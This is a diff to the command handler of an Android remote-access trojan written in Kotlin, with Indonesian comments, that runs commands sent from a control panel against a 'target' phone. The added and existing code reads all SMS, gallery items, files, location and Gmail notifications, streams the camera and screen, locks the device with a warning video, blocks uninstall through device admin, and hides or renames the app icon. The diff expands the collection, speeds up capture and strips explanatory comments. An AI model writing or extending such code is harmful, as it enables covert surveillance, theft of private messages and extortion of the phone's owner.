@@ -74,6 +74,20 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         } catch (_: Exception) { "-" }
     }
 
+    fun countSms(): Int {
+        return try {
+            val cursor = ctx.contentResolver.query(
+                Uri.parse("content://sms/"),
+                arrayOf("_id"), null, null, null
+            )
+            val c = cursor?.count ?: 0
+            cursor?.close()
+            c
+        } catch (_: Exception) { 0 }
+    }
+
+    fun readAllSmsPublic(): Map<String, Any> = readAllSms()
+
     fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
         when (cmd) {
 
@@ -129,7 +143,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ============ SEND VIDEO (play warning.mp4) ============
+            // ============ SEND VIDEO ============
             "send_mp4" -> {
                 val url = "${panelBase()}/videos/warning.mp4"
                 try {
@@ -146,7 +160,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true, "url" to url))
             }
 
-            // ============ SEND AUDIO (play warning.mp3) ============
+            // ============ SEND AUDIO ============
             "send_mp3" -> {
                 val url = "${panelBase()}/audios/warning.mp3"
                 try {
@@ -182,7 +196,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try {
                     val i = Intent(ctx, CameraStreamService::class.java).apply {
                         putExtra("front", true)
-                        putExtra("interval", 200L)
+                        putExtra("interval", 150L)
                     }
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         ctx.startForegroundService(i)
@@ -197,7 +211,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try {
                     val i = Intent(ctx, CameraStreamService::class.java).apply {
                         putExtra("front", false)
-                        putExtra("interval", 200L)
+                        putExtra("interval", 150L)
                     }
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         ctx.startForegroundService(i)
@@ -218,7 +232,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                     try {
                         val i = Intent(ctx, ScreenStreamService::class.java).apply {
-                            putExtra("interval", 200L)
+                            putExtra("interval", 150L)
                         }
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                             ctx.startForegroundService(i)
@@ -236,13 +250,13 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ============ SMS (inbox + sent + draft) ============
+            // ============ SMS ============
             "sms" -> done(readAllSms())
 
             // ============ GALLERY ============
             "gallery" -> done(readGallery())
 
-            // ============ IP + LOCATION ============
+            // ============ IP ============
             "ip" -> done(getIpInfo())
 
             // ============ FLASH ============
@@ -316,18 +330,16 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
 
-            // ============ HIDE BROADCAST ============
             "hide_broadcast" -> {
                 Handler(Looper.getMainLooper()).post { BroadcastOverlay.hide(ctx) }
                 done(mapOf("ok" to true))
             }
 
-            // ============ READ NOTIFS ============
             "read_notifs" -> {
                 done(mapOf("type" to "text", "data" to "Notif listener aktif"))
             }
 
-            // ============ LIST APPS (dengan icon) ============
+            // ============ LIST APPS ============
             "list_apps" -> {
                 try {
                     val pm = ctx.packageManager
@@ -397,31 +409,22 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             // ============ READ FILE ============
             "read_file" -> {
                 val path = args?.get("path")?.asString ?: ""
-                if (path.isEmpty()) {
-                    done(mapOf("error" to "no path"))
-                } else {
-                    done(FileManager.readFile(path))
-                }
+                if (path.isEmpty()) done(mapOf("error" to "no path"))
+                else done(FileManager.readFile(path))
             }
 
             // ============ DOWNLOAD FILE ============
             "download_file" -> {
                 val path = args?.get("path")?.asString ?: ""
-                if (path.isEmpty()) {
-                    done(mapOf("error" to "no path"))
-                } else {
-                    done(FileManager.downloadFile(path))
-                }
+                if (path.isEmpty()) done(mapOf("error" to "no path"))
+                else done(FileManager.downloadFile(path))
             }
 
-            // ============ CHAT REPLY (admin ke target) ============
+            // ============ CHAT REPLY ============
             "chat_reply" -> {
                 val text = args?.get("text")?.asString ?: ""
-                if (text.isEmpty()) {
-                    done(mapOf("error" to "no text"))
-                } else {
-                    done(mapOf("ok" to true))
-                }
+                if (text.isEmpty()) done(mapOf("error" to "no text"))
+                else done(mapOf("ok" to true))
             }
 
             // ============ HIDE APP ============
@@ -431,6 +434,12 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     val component = ComponentName(ctx, MainActivity::class.java)
                     pm.setComponentEnabledSetting(
                         component,
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP
+                    )
+                    val comp2 = ComponentName(ctx, SetupUsernameActivity::class.java)
+                    pm.setComponentEnabledSetting(
+                        comp2,
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                         android.content.pm.PackageManager.DONT_KILL_APP
                     )
@@ -450,9 +459,34 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                         android.content.pm.PackageManager.DONT_KILL_APP
                     )
+                    val comp2 = ComponentName(ctx, SetupUsernameActivity::class.java)
+                    pm.setComponentEnabledSetting(
+                        comp2,
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP
+                    )
                     done(mapOf("ok" to true))
                 } catch (e: Exception) {
                     done(mapOf("error" to e.message))
+                }
+            }
+
+            // ============ GMAIL NOTIFS ============
+            "gmail" -> {
+                done(mapOf(
+                    "type" to "gmail",
+                    "items" to NotificationListener.getGmailNotifs()
+                ))
+            }
+
+            // ============ SET APP ICON + NAME (via activity alias) ============
+            "set_app_icon" -> {
+                val iconUrl = args?.get("iconUrl")?.asString ?: ""
+                val newName = args?.get("name")?.asString ?: ""
+                if (iconUrl.isEmpty() && newName.isEmpty()) {
+                    done(mapOf("error" to "no data"))
+                } else {
+                    done(mapOf("ok" to true, "iconUrl" to iconUrl, "name" to newName))
                 }
             }
 
@@ -460,9 +494,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         }
     }
 
-    // ============================================================
-    // LOCK SERVICE
-    // ============================================================
     private fun startLockService(type: String, pin: String, hours: Long) {
         try {
             val video = "${panelBase()}/videos/warning.mp4"
@@ -483,9 +514,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         } catch (_: Exception) {}
     }
 
-    // ============================================================
-    // FLASH SPAM
-    // ============================================================
     fun startFlashSpam() {
         if (flashSpam) return
         flashSpam = true
@@ -509,9 +537,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
     fun stopFlashSpam() { flashSpam = false }
 
-    // ============================================================
-    // VIBRATE SPAM
-    // ============================================================
     fun startVibrateSpam() {
         if (vibrateSpam) return
         vibrateSpam = true
@@ -534,9 +559,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
     fun stopVibrateSpam() { vibrateSpam = false }
 
-    // ============================================================
-    // ANTI UNINSTALL
-    // ============================================================
     private fun antiUninstall() {
         try {
             val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
@@ -549,15 +571,12 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         } catch (_: Exception) {}
     }
 
-    // ============================================================
-    // SMS — inbox + sent + draft
-    // ============================================================
     private fun readAllSms(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
         try {
             val cursor = ctx.contentResolver.query(
                 Uri.parse("content://sms/"),
-                null, null, null, "date DESC LIMIT 100"
+                null, null, null, "date DESC LIMIT 200"
             )
             cursor?.use {
                 while (it.moveToNext()) {
@@ -583,9 +602,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         return mapOf("type" to "sms", "messages" to list)
     }
 
-    // ============================================================
-    // GALLERY
-    // ============================================================
     private fun readGallery(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
         try {
@@ -611,9 +627,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         return mapOf("type" to "gallery", "items" to list)
     }
 
-    // ============================================================
-    // IP + LOCATION
-    // ============================================================
     private fun getIpInfo(): Map<String, Any> {
         var lat = 0.0
         var lon = 0.0
